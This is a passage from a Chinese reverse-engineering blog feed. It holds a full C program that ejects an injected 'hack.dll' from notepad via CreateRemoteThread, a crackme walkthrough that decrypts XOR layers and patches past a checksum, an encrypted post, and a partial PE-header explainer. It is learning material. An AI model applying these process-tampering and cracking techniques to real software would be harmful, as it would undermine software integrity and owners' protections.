title="DLL卸载"></a>DLL卸载</h2><ul><li>CreateToolhelp32Snapshot去拍一个<strong>TH32CS_SNAPALL</strong>参数的系统快照</li><li>Process32First和NEXT通过PROCESSENTRY32结构体的szExeFile来比较找到notepad</li><li>CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID)进程的所有模块快照找到dll加载基址 即dll句柄</li><li>后面和加载一样，创建远程线程FreeLibrary掉库</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_PROC_NAME    (<span class="string">L&quot;notepad.exe&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_DLL_NAME    (<span class="string">L&quot;hack.dll&quot;</span>)</span></span><br><span class="line">DWORD <span class="title function_">FindProcessID</span><span class="params">(LPCTSTR szProcessName)</span> &#123;</span><br><span class="line">    DWORD dwPID = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">    HANDLE hSnapShot = INVALID_HANDLE_VALUE;</span><br><span class="line">    PROCESSENTRY32 pe;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取系统快照</span></span><br><span class="line">    pe.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找进程</span></span><br><span class="line">    Process32First(hSnapShot, &amp;pe);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!_tcsicmp(szProcessName, (LPCTSTR)pe.szExeFile)) &#123;</span><br><span class="line">            dwPID = pe.th32ProcessID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (Process32Next(hSnapShot, &amp;pe));</span><br><span class="line"></span><br><span class="line">    CloseHandle(hSnapShot);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dwPID;</span><br><span class="line">&#125;</span><br><span class="line">BOOL <span class="title function_">EjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllName)</span> &#123;</span><br><span class="line">    BOOL bMore = FALSE, bFound = FALSE;</span><br><span class="line">    HANDLE hSnapshot, hProcess, hThread;</span><br><span class="line">    HMODULE hModule = <span class="literal">NULL</span>;</span><br><span class="line">    MODULEENTRY32 me = &#123; <span class="keyword">sizeof</span>(me) &#125;;</span><br><span class="line">    LPTHREAD_START_ROUTINE pThreadProc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// dwPID = notepad 进程id</span></span><br><span class="line">    <span class="comment">// 使用TH32CS_SNAPMODULE 参数，获取加载到notepad 进程dll的名称</span></span><br><span class="line">    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID);<span class="comment">//句柄</span></span><br><span class="line"></span><br><span class="line">    bMore = Module32First(hSnapshot, &amp;me);</span><br><span class="line">    <span class="keyword">for</span> (; bMore; bMore = Module32Next(hSnapshot, &amp;me))<span class="comment">//循环比较地址</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!_tcsicmp((LPCTSTR)me.szModule, szDllName) ||</span><br><span class="line">            !_tcsicmp((LPCTSTR)me.szExePath, szDllName)) &#123;</span><br><span class="line">            bFound = TRUE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!bFound) &#123;</span><br><span class="line">        CloseHandle(hSnapshot);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))<span class="comment">//获取目标进程的句柄</span></span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;OpenProcess(%d) failed!!! [%d]\n&quot;</span>, dwPID, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hModule = GetModuleHandle(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, <span class="string">&quot;FreeLibrary&quot;</span>);<span class="comment">//获取FreeLibrary的api地址</span></span><br><span class="line">    hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">        pThreadProc, me.modBaseAddr,</span><br><span class="line">        <span class="number">0</span>, <span class="literal">NULL</span>);      <span class="comment">//卸载dll</span></span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">    CloseHandle(hSnapshot);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain()</span><br><span class="line">&#123;</span><br><span class="line">    DWORD dwPID = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">    dwPID = FindProcessID(DEF_PROC_NAME);<span class="comment">//查找notepad的id    </span></span><br><span class="line">    <span class="keyword">if</span> (dwPID == <span class="number">0xFFFFFFFF</span>) &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;There is no &lt;%s&gt; process!\n&quot;</span>, DEF_PROC_NAME);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _tprintf(<span class="string">L&quot;PID of \&quot;%s\&quot; is %d\n&quot;</span>, DEF_PROC_NAME, dwPID);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (EjectDll(dwPID, DEF_DLL_NAME))</span><br><span class="line">        _tprintf(<span class="string">L&quot;EjectDll(%d, \&quot;%s\&quot;) success!!!\n&quot;</span>, dwPID, DEF_DLL_NAME);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        _tprintf(<span class="string">L&quot;EjectDll(%d, \&quot;%s\&quot;) failed!!!\n&quot;</span>, dwPID, DEF_DLL_NAME);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>内嵌补丁(Embedded patch)</title>
      <link href="/2023/05/23/embedded-patch/"/>
      <url>/2023/05/23/embedded-patch/</url>
      
        <content type="html"><![CDATA[<h1 id="内嵌补丁-Embedded-patch"><a href="#内嵌补丁-Embedded-patch" class="headerlink" title="内嵌补丁(Embedded patch)"></a>内嵌补丁(Embedded patch)</h1><p>链接：<a href="https://pan.baidu.com/s/1sOzl2CaOaEMCoEJZTVrU-g">https://pan.baidu.com/s/1sOzl2CaOaEMCoEJZTVrU-g</a><br>提取码：57g8</p><p>从入口点开始跟到0040109B</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0040109B</span> &lt;unpackme#<span class="number">1.</span>ac | <span class="number">50</span>                       | push eax                                         |</span><br><span class="line"><span class="number">0040109</span>C                | <span class="number">8B</span>D8                     | mov ebx,eax                                      |</span><br><span class="line"><span class="number">0040109</span>E                | B9 <span class="number">54010000</span>              | mov ecx,<span class="number">0x154</span>                                    | ecx:<span class="string">&quot;`桡&quot;</span></span><br><span class="line"><span class="number">004010</span>A3                | <span class="number">8033</span> <span class="number">44</span>                  | xor byte ptr ds:[ebx],<span class="number">0x44</span>                       |</span><br><span class="line"><span class="number">004010</span>A6                | <span class="number">83E9</span> <span class="number">01</span>                  | sub ecx,<span class="number">0x1</span>                                      | ecx:<span class="string">&quot;`桡&quot;</span></span><br><span class="line"><span class="number">004010</span>A9                | <span class="number">43</span>                       | inc ebx                                          |</span><br><span class="line"><span class="number">004010</span>AA                | <span class="number">83F</span>9 <span class="number">00</span>                  | cmp ecx,<span class="number">0x0</span>                                      | ecx:<span class="string">&quot;`桡&quot;</span></span><br><span class="line"><span class="number">004010</span>AD                | <span class="number">75</span> F4                    | jne unpackme#<span class="number">1.</span>ac<span class="number">.4010</span>A3                         |</span><br><span class="line"><span class="number">004010</span>AF                | <span class="number">50</span>                       | push eax                                         |</span><br><span class="line"><span class="number">004010B</span>0                | E8 <span class="number">08000000</span>              | call &lt;unpackme#<span class="number">1.</span>ac.sub_4010BD&gt;                  |</span><br><span class="line"><span class="number">004010B</span>5                | <span class="number">50</span>                       | push eax                                         |</span><br><span class="line"><span class="number">004010B</span>6                | E8 <span class="number">7</span>EFFFFFF              | call &lt;unpackme#<span class="number">1.</span>ac.sub_401039&gt;                  |</span><br><span class="line"><span class="number">004010B</span>B                | <span class="number">58</span>                       | pop eax                                          |</span><br><span class="line"><span class="number">004010B</span>C                | C3                       | ret                                              |</span><br></pre></td></tr></table></figure><p>此时eax为004010F5，所以会对004010F5 - 004010F5+0x154区域进行一次异或解密</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">004010F</span>5 - <span class="number">004010F</span>5+<span class="number">0x154</span> ^<span class="number">0x44</span></span><br></pre></td></tr></table></figure><p>跟进去<code>call &lt;unpackme#1.ac.sub_4010BD&gt;   </code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">004010B</span>D &lt;unpackme#<span class="number">1.</span>ac | <span class="number">50</span>                       | push eax                                         |</span><br><span class="line"><span class="number">004010B</span>E                | BB <span class="number">07104000</span>              | mov ebx,unpackme#<span class="number">1.</span>ac<span class="number">.401007</span>                     |</span><br><span class="line"><span class="number">004010</span>C3                | B9 <span class="number">7F</span>000000              | mov ecx,<span class="number">0x7F</span>                                     |</span><br><span class="line"><span class="number">004010</span>C8                | <span class="number">8033</span> <span class="number">07</span>                  | xor byte ptr ds:[ebx],<span class="number">0x7</span>                        |</span><br><span class="line"><span class="number">004010</span>CB                | <span class="number">83E9</span> <span class="number">01</span>                  | sub ecx,<span class="number">0x1</span>                                      |</span><br><span class="line"><span class="number">004010</span>CE                | <span class="number">43</span>                       | inc ebx                                          |</span><br><span class="line"><span class="number">004010</span>CF                | <span class="number">83F</span>9 <span class="number">00</span>                  | cmp ecx,<span class="number">0x0</span>                                      |</span><br><span class="line"><span class="number">004010</span>D2                | <span class="number">75</span> F4                    | jne unpackme#<span class="number">1.</span>ac<span class="number">.4010</span>C8                         |</span><br><span class="line"><span class="number">004010</span>D4                | <span class="number">8B</span>D8                     | mov ebx,eax                                      |</span><br><span class="line"><span class="number">004010</span>D6                | B9 <span class="number">54010000</span>              | mov ecx,<span class="number">0x154</span>                                    |</span><br><span class="line"><span class="number">004010</span>DB                | <span class="number">8033</span> <span class="number">11</span>                  | xor byte ptr ds:[ebx],<span class="number">0x11</span>                       |</span><br><span class="line"><span class="number">004010</span>DE                | <span class="number">83E9</span> <span class="number">01</span>                  | sub ecx,<span class="number">0x1</span>                                      |</span><br><span class="line"><span class="number">004010E1</span>                | <span class="number">43</span>                       | inc ebx                                          |</span><br><span class="line"><span class="number">004010E2</span>                | <span class="number">83F</span>9 <span class="number">00</span>                  | cmp ecx,<span class="number">0x0</span>                                      |</span><br><span class="line"><span class="number">004010E5</span>                | <span class="number">75</span> F4                    | jne unpackme#<span class="number">1.</span>ac<span class="number">.4010</span>DB                         |</span><br><span class="line"><span class="number">004010E7</span>                | <span class="number">58</span>                       | pop eax                                          |</span><br><span class="line"><span class="number">004010E8</span>                | C3                       | ret                                              |</span><br></pre></td></tr></table></figure><p>继续解密</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00401007</span> - <span class="number">00401007</span>+<span class="number">0x7f</span> ^<span class="number">0x7</span></span><br><span class="line"><span class="number">004010F</span>5 - <span class="number">004010F</span>5+<span class="number">0x154</span> ^<span class="number">0x11</span></span><br></pre></td></tr></table></figure><p>跟进去<code>call &lt;unpackme#1.ac.sub_401039&gt;   </code></p><p><img src="/2023/05/23/embedded-patch/image-20230523155641278.png" alt="image-20230523155641278"></p><p>他会对经过两次解密后的004010F5 - 004010F5+0x154区域一次移动一字节，一次四个字节，累加到ebx中与0x31EB8DB0的校验和比对，不一致就调用exitprocess退出进程，否则就跳到</p><p>中间还会调用0040108A去做解密40121e执行</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0040108</span>A &lt;unpackme#<span class="number">1.</span>ac | <span class="number">50</span>                       | push eax                                         |</span><br><span class="line"><span class="number">0040108B</span>                | <span class="number">56</span>                       | push esi                                         | esi:<span class="string">&quot;`桡&quot;</span></span><br><span class="line"><span class="number">0040108</span>C                | <span class="number">8B</span>D8                     | mov ebx,eax                                      |</span><br><span class="line"><span class="number">0040108</span>E                | <span class="number">8B</span>CE                     | mov ecx,esi                                      | esi:<span class="string">&quot;`桡&quot;</span></span><br><span class="line"><span class="number">00401090</span>                | <span class="number">8033</span> <span class="number">17</span>                  | xor byte ptr ds:[ebx],<span class="number">0x17</span>                       |</span><br><span class="line"><span class="number">00401093</span>                | <span class="number">43</span>                       | inc ebx                                          |</span><br><span class="line"><span class="number">00401094</span>                | <span class="number">3B</span>D9                     | cmp ebx,ecx                                      |</span><br><span class="line"><span class="number">00401096</span>                | <span class="number">75</span> F8                    | jne unpackme#<span class="number">1.</span>ac<span class="number">.401090</span>                         |</span><br><span class="line"><span class="number">00401098</span>                | <span class="number">58</span>                       | pop eax                                          |</span><br><span class="line"><span class="number">00401099</span>                | <span class="number">5</span>E                       | pop esi                                          | esi:<span class="string">&quot;`桡&quot;</span></span><br><span class="line"><span class="number">0040109</span>A                | C3                       | ret                                              |</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0040124</span>A<span class="number">-00401280</span> ^<span class="number">0x17</span></span><br></pre></td></tr></table></figure><p><img src="/2023/05/23/embedded-patch/image-20230523161559913.png" alt="image-20230523161559913"></p><p>这里调用getmodulehadle返回一个句柄，这个句柄值其实就是模块加载的虚拟内存的基地址，之前学win32时一直不知道这个句柄具体值。。。</p><p>DialogBoxParamA的第四个参数lpDialogFunc就是用来处理对话框消息的回调函数即为004010F5</p><p><img src="/2023/05/23/embedded-patch/image-20230523164357610.png" alt="image-20230523164357610"></p><p>发现代码段里掺杂着数据区，估计这程序是用纯汇编写的，反正我不知道还有什么其他方法可以这样掺杂(还是太菜了）</p><h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><p>这个时候其实可以去改掉加密的字符串数据为我们想要的，然后去改掉校验和的硬编码</p><h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>用内嵌补丁，在完成检查校验和，jmp到入口点40121e之前，去劫持到我们的补丁，补丁做修改操作后，再jmp到入口点</p><p>看一下区段</p><p><img src="/2023/05/23/embedded-patch/image-20230523165512284.png" alt="image-20230523165512284"></p><p>代码段文件大小0x400，内存大小0x280(内存对齐后一般会变为0x1000)</p><p>有空余部分供我们写补丁代码，</p><p>直接用会汇编把数据改了就行</p><p><img src="/2023/05/23/embedded-patch/image-20230523172707047.png" alt="image-20230523172707047"></p><p>在去改下jmp到补丁的地方</p><p><img src="/2023/05/23/embedded-patch/image-20230523173024075.png" alt="image-20230523173024075"></p><p>改掉</p><p><img src="/2023/05/23/embedded-patch/image-20230523173139510.png" alt="image-20230523173139510"></p><p>但是这里是要经过加密的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00401007</span> - <span class="number">00401007</span>+<span class="number">0x7f</span>(<span class="number">40</span> <span class="number">1086</span>) ^<span class="number">0x7</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(<span class="number">0xE9</span>^<span class="number">7</span>)</span><br><span class="line"><span class="string">&#x27;0xee&#x27;</span></span><br><span class="line">&gt;&gt;&gt; hex(<span class="number">0x05</span>^<span class="number">7</span>)</span><br><span class="line"><span class="string">&#x27;0x2&#x27;</span></span><br><span class="line">&gt;&gt;&gt; hex(<span class="number">0x02</span>^<span class="number">7</span>)</span><br><span class="line"><span class="string">&#x27;0x5&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/2023/05/23/embedded-patch/image-20230523173624190.png" alt="image-20230523173624190"></p><p>patch保存一下就好了，ok</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>:(</title>
      <link href="/2023/05/20/2023-5-20/"/>
      <url>/2023/05/20/2023-5-20/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ab9f1a9f344177f8385ebc49cb1adc07442e32ba7cfa4859c51e580c8d862a8e">9437a95e56b24d5da67ff8d3ebbb0d56afa721ffb68934a5c51890a2a491300a58e92e6b56af2ebbdbc377deaa212bf9f157fcdcb5f4708b51a0612cd90096b21938562bd6bed84efb729fa4caf50f4b22f4337db4d1a1ccf2407aa706ccc01ea6504f9dea05278d222f874195aaf36a7443cc68ee81a3c21a9defe11fb506c0c7278a7ed98f7635a3788bbb8c3898f3ce546f15c95a711bbd018bd326ca3fc39a93408c11a2318d2afb338395d57ad645b3d661f8525d43673647c669c3ef2adc24ef6cfdb95f079f38dc6ad09048e922413cead40aada33355b05b868be0bb584f4a5419acd51f70f1eb76b49f52594579523351512c0666c95b74de82140c</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PE文件解析(PE File Parsing)</title>
      <link href="/2023/05/19/PE-FILE/"/>
      <url>/2023/05/19/PE-FILE/</url>
      
        <content type="html"><![CDATA[<h1 id="PE-Portable-Executable-File-Parsing"><a href="#PE-Portable-Executable-File-Parsing" class="headerlink" title="PE(Portable Executable) File Parsing"></a>PE(Portable Executable) File Parsing</h1><p>WIN32 PE文件解析</p><p>链接：<a href="https://pan.baidu.com/s/1SR6IgJ645IBTPWy3PXNQgQ">https://pan.baidu.com/s/1SR6IgJ645IBTPWy3PXNQgQ</a><br>提取码：4veh</p><ul><li>RVA：Relative Virtual Address（相对虚拟地址）。RVA 是指相对于映像基址的地址偏移量，在内存中定位特定数据的地址。</li><li>RAW：Raw Data（原始数据）。RAW 是指 PE 文件中未经任何处理或压缩的原始二进制数据，它直接从文件中读取，例如节的原始数据。有的也叫FOA(file offset address)</li></ul><p><img src="/2023/05/19/PE-FILE/image-20230518235342704.png" alt="image-20230518235342704"></p><h2 id="PE头"><a href="#PE头" class="headerlink" title="PE头"></a>PE头</h2><h3 id="DOS头"><a href="#DOS头" class="headerlink" title="DOS头"></a>DOS头</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span>      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// Bytes on last page of file</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// Pages in file</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// Relocations</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// Initial (relative) SS value</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// Initial SP value</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// Initial IP value</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// Initial (relative) CS value</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// File address of relocation table</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// File address of new exe header</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure><p>64字节，主要是为了兼容当时比较盛行的DOS系统,我们只关心下面两个</p><ul><li>e_magic:dos签名 4D5A(MZ)</li><li>e_lfanew:NT&#x2F;PE头偏移(IMAGE_NT_HEADERS)<ul><li>如果该值为0，则该文件是一个DOS“MZ“可执行文件，Windows会启动DOS子系统来执行它，否则为Windows的PE可执行文件</li></ul></li></ul><h3 id="DOS存根-stub"><a href="#DOS存根-stub" class="headerlink" title="DOS存根(stub)"></a>DOS存根(stub)</h3><p>e_lfanew偏移和_IMAGE_DOS_HEADER之间位置</p><p>前0xd字节是16位的汇编，输出This program cannot be run in DOS mode.后退出</p><p>dos头的e_cs e_ip一般指向这里</p><h3 id="NT-x2F-PE头"><a href="#NT-x2F-PE头" class="headerlink" title="NT&#x2F;PE头"></a>NT&#x2F;PE头</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">    DWORD Signature;</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><h4 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h4><p>PE签名 0x50450000(“PE00”)</p><h4 id="标准PE头-IMAGE-FILE-HEADER-FileHeader"><a href="#标准PE头-IMAGE-FILE-HEADER-FileHeader" class="headerlink" title="标准PE头 IMAGE_FILE_HEADER FileHeader"></a>标准PE头 IMAGE_FILE_HEADER FileHeader</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">    WORD    Machine;                <span class="comment">// 目标机器的体系结构类型。</span></span><br><span class="line">    WORD    NumberOfSections;       <span class="comment">// 文件中的节的数量。</span></span><br><span class="line">    DWORD   TimeDateStamp;          <span class="comment">// 文件创建或修改的时间戳。</span></span><br><span class="line">    DWORD   PointerToSymbolTable;   <span class="comment">// COFF符号表的文件偏移量。</span></span><br><span class="line">    DWORD   NumberOfSymbols;        <span class="comment">// COFF符号表中的符号数量。</span></span><br><span class="line">    WORD    SizeOfOptionalHeader;   <span class="comment">// 可选头的大小（以字节为单位）。</span></span><br><span class="line">    WORD    Characteristics;        <span class="comment">// 文件的特性标志。</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><ul><li>Machine<ul><li>PE文件的目标架构,执行文件所针对的CPU或处理器架构类型</li></ul></li><li>NumberOfSections<ul><li>节表数量</li></ul></li><li>TimeDateStamp<ul><li>PE文件的创建或修改时间戳</li></ul></li><li>PointerToSymbolTable<ul><li>符号表在文件中的偏移量</li></ul></li><li>SizeOfOptionalHeader<ul><li>IMAGE_OPTIONAL_HEADER32结构体长度</li></ul></li><li>Characteristics<ul><li>标示文件的属性 是否为dll，是否可执行等，bitOR形式</li></ul></li></ul><h4 id="扩展PE头-IMAGE-OPTIONAL-HEADER32-OptionalHeader"><a href="#扩展PE头-IMAGE-OPTIONAL-HEADER32-OptionalHeader" class="headerlink" title="扩展PE头 IMAGE_OPTIONAL_HEADER32 OptionalHeader"></a>扩展PE头 IMAGE_OPTIONAL_HEADER32 OptionalHeader</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_NUMBEROF_DIRECTORY_ENTRIES    16</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;     <span class="comment">// 数据目录项在内存中的虚拟地址。</span></span><br><span class="line">    DWORD   Size;               <span class="comment">// 数据目录项的大小（字节数）。</span></span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    WORD    Magic;                         <span class="comment">// 魔术字段，标识可选头的格式（32位或64位）。</span></span><br><span class="line">    BYTE    MajorLinkerVersion;            <span class="comment">// 链接器的主版本号。</span></span><br><span class="line">    BYTE    MinorLinkerVersion;            <span class="comment">// 链接器的次版本号。</span></span><br><span class="line">    DWORD   SizeOfCode;                    <span class="comment">// 代码段的大小，以字节为单位。</span></span><br><span class="line">    DWORD   SizeOfInitializedData;         <span class="comment">// 已初始化数据段的大小，以字节为单位。</span></span><br><span class="line">    DWORD   SizeOfUninitializedData;       <span class="comment">// 未初始化数据段的大小，以字节为单位。</span></span><br><span class="line">    DWORD   AddressOfEntryPoint;           <span class="comment">// 程序入口点（程序的起始执行地址）相对于映像基址的偏移量。</span></span><br><span class="line">    DWORD   BaseOfCode;                    <span class="comment">// 代码段的起始地址相对于映像基址的偏移量。</span></span><br><span class="line">    DWORD   BaseOfData;                    <span class="comment">// 数据段（仅用于PE32）的起始地址相对于映像基址的偏移量。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   ImageBase;                     <span class="comment">// 程序的首选装载地址（映像基址）。</span></span><br><span class="line">    DWORD   SectionAlignment;              <span class="comment">// 节的内存对齐大小，以字节为单位。</span></span><br><span class="line">    DWORD   FileAlignment;                 <span class="comment">// 文件对齐大小，以字节为单位。</span></span><br><span class="line">    WORD    MajorOperatingSystemVersion;   <span class="comment">// 操作系统的主版本号要求。</span></span><br><span class="line">    WORD    MinorOperatingSystemVersion;   <span class="comment">// 操作系统的次版本号要求。</span></span><br><span class="line">    WORD    MajorImageVersion;             <span class="comment">// 映像文件的主版本号。</span></span><br><span class="line">    WORD    MinorImageVersion;             <span class="comment">// 映像文件的次版本号。</span></span><br><span class="line">    WORD    MajorSubsystemVersion;         <span class="comment">// 子系统的主版本号要求。</span></span><br><span class="line">    WORD    MinorSubsystemVersion;         <span class="comment">// 子系统的次版本号要求。</span></span><br><span class="line">    DWORD   Win32VersionValue;             <span class="comment">// 保留字段，用于指定Win32运行时版本。</span></span><br><span class="line">    DWORD   SizeOfImage;                   <span class="comment">// 映像的内存大小，包括所有头和节的大小。</span></span><br><span class="line">    DWORD   SizeOfHeaders;                 <span class="comment">// 头的总大小，包括所有头的大小。</span></span><br><span class="line">    DWORD   CheckSum;                      <span class="comment">// 映像文件的校验和。</span></span><br><span class="line">    WORD    Subsystem;                     <span class="comment">// 程序所依赖的子系统类型。</span></span><br><span class="line">    WORD    DllCharacteristics;            <span class="comment">// DLL文件的特性标志。</span></span><br><span class="line">    DWORD   SizeOfStackReserve;            <span class="comment">// 初始化堆栈的保留内存大小。</span></span><br><span class="line">    DWORD   SizeOfStackCommit;             <span class="comment">// 初始化堆栈的提交内存大小。</span></span><br><span class="line">    DWORD   SizeOfHeapReserve;             <span class="comment">// 初始化堆的保留内存大小。</span></span><br><span class="line">    DWORD   SizeOfHeapCommit;              <span class="comment">// 初始化堆的提交内存大小。</span></span><br><span class="line">    DWORD   LoaderFlags;                   <span class="comment">// 加载器标志。</span></span><br><span class="line">    DWORD   NumberOfRvaAndSizes;           <span class="comment">// 数据目录项的数量。</span></span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];   <span class="comment">// 数据目录数组。</span></span><br><span class="line"></span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, 